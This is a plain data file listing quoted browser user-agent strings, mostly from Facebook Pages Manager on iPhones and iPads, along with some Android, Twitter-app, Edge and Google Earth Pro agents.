"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D47 [FBAN/FBPageAdmin;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBDI/BE9904C1-02F3-4FF4-A216-0D0186BE28CA]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBPageAdmin;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/8C4F700B-C842-4EA5-AE9D-D6CF8C6E4411]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBPageAdmin;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/B7D4BC73-59EB-41F0-9C50-48DC0BE83772]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBPageAdmin;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBDI/BE9904C1-02F3-4FF4-A216-0D0186BE28CA]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H117 [FBAN/FBPageAdmin;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/8613AF12-A13C-4025-9DFC-B412B9874CC3]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/9285700B-42ED-436C-9503-3A583CA7092D]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/E9AF8DA6-3525-4138-83FC-27CB5EE84A4D]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/DAD28809-6C44-43B9-97EB-D9ABED1C63C4]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/8409F012-C3CD-4CBF-AE73-055ECF0F61CB]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/917F706D-DE04-44EE-A132-23035F24B5A4]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/DEF09D63-CEC0-46B0-9A91-24AE98C99736]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/F30CA2E6-3DD8-421D-AD0D-1A18B2DC6E2B]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBPageAdmin;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/568D4DA5-4665-4325-9206-2ADB71EA3112]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/AC79D0DC-23B9-4DF6-8C59-F5A44E8B1D75]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H17 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/2CD1905A-6A0F-48E0-8AB3-BE55C4CC4689]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/99627F61-AD7C-47FC-9B6D-1A5E8598E73F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/77AD5F85-8921-49EF-810A-931B1BE60ED8]"
"Mozilla/5.0 (iPad; CPU OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.5;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/8A557717-7CF9-4264-8A8D-D1DE6F3AD7E1]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/uk_UA;FBOP/5;FBDI/47BE7009-CB71-4C56-8003-EEB775BC714F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.9;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/7B7D2256-5843-4E84-AC9E-E7B086C39388]"
"Mozilla/5.0 (iPad; CPU OS 12_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.5.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/D9C021E4-148B-4158-9C41-FBA8E68EB3D8]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.9;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/7B7D2256-5843-4E84-AC9E-E7B086C39388]"
"Mozilla/5.0 (iPad; CPU OS 12_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.5.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/D9C021E4-148B-4158-9C41-FBA8E68EB3D8]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/1BBEFD49-F2E6-4C19-AE10-A2D1075B0DFF]"
"Mozilla/5.0 (iPad; CPU OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.9;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/8A557717-7CF9-4264-8A8D-D1DE6F3AD7E1]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/81C4138A-1CE7-45B7-8B4E-2C6E0B74C5AA]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/8B86F0CB-22B7-42E9-BCE0-987B36794783]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/81C4138A-1CE7-45B7-8B4E-2C6E0B74C5AA]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/8B86F0CB-22B7-42E9-BCE0-987B36794783]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/CC13F623-6B20-496A-9523-943D4B43A5F9]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/10576A5B-345B-49C8-BCBA-020B7DA2306E]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/CC13F623-6B20-496A-9523-943D4B43A5F9]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/527B855B-B878-420F-93C4-9000BAB072EE]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/EE699252-1A4E-4835-ADDE-D1E4C35067EC]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/14.0.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/85B6E63F-54BB-4925-99E4-410F4EBC078D]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/7C99F7DD-3C36-4C47-8352-3B8688477FC4]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5;FBDI/2801586E-D05C-411E-864B-88BF55DA058F]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/F1F4C422-4053-461C-8E0B-750049B755F9]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/14.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/A368D926-8BE4-4E21-BBFA-E5665B932DCB] [ip:87.10.9.219]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/099B01BC-EFE0-4AC2-9956-A27FBE9728F9]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/14.0;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/84585C1B-5FC0-4DE4-8F00-9F7123583957]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/]"
"Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad8,12;FBMD/iPad;FBSN/iOS;FBSV/14.0;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5;FBDI/246449CE-3622-43A8-AF32-63481C1E4F5A]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/KDDI]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBPageAdmin;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBCR/Viettel]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/KDDI]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.4;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/vodafone HU]"
"Mozilla/5.0 (iPad; CPU OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/GroupsForiOS;FBAV/48.0;FBBV/40069465;FBRV/0;FBDV/iPad3,4;FBMD/iPad;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/;FBID/tablet;FBLC/pt_BR;FBOP/5]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBPageAdmin;FBAV/86.0;FBBV/83286586;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/GroupsForiOS;FBAV/166.0.0.53.95;FBBV/101310068;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Carrier;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Linux; Android 9; POCO F1 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 GSA/9.51.8.21.arm64"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.4.5.21.arm"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.12.3.18362; 10.0.0.0.18362.295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-U29 Build/HUAWEICUN-U29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-U29 Build/HUAWEICUN-U29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.3; MediaPad T1 8.0 Build/HuaweiMediaPad) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
"AndroidDownloadManager/8.0.0 (Linux; U; Android 8.0.0; LDN-LX2 Build/HUAWEILDN-LX2)"
"Mozilla/5.0 (Linux; Android 4.3; MediaPad T1 8.0 Build/HuaweiMediaPad) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36"
"Mozilla/5.0 (Linux; Android 6.0; FEVER) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-U29 Build/HUAWEICUN-U29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.12.3.18362; 10.0.0.0.18362.295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A600FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.4.5.21.arm"
"Mozilla/5.0 (Linux; Android 9; POCO F1 Build/PKQ1.180729.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 GSA/9.51.8.21.arm64"
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/538.1 (KHTML, like Gecko) Google Earth Pro/7.3.2.5776 Safari/538.1"
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/538.1 (KHTML, like Gecko) Google Earth Pro/7.3.3.7786 Safari/538.1"
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) Google Earth Pro/7.3.3.7786 Safari/538.1"
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/538.1 (KHTML, like Gecko) Google Earth Pro/7.3.4.8248 Safari/538.1"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/538.1 (KHTML, like Gecko) Google Earth Pro/7.3.4.8248 Safari/538.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H384 Twitter for iPhone/10.51.2"
"Mozilla/5.0 (Linux; Android 14; CPH2577 Build/UP1A.230620.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 12; vivo 1907_19 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-A245F Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; 22101316G Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.143 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S911U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; NE2213 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; V2333 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; ALI-NX1 Build/HONORALI-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 7 Build/AP2A.240805.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-G990U2 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SM-N981U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
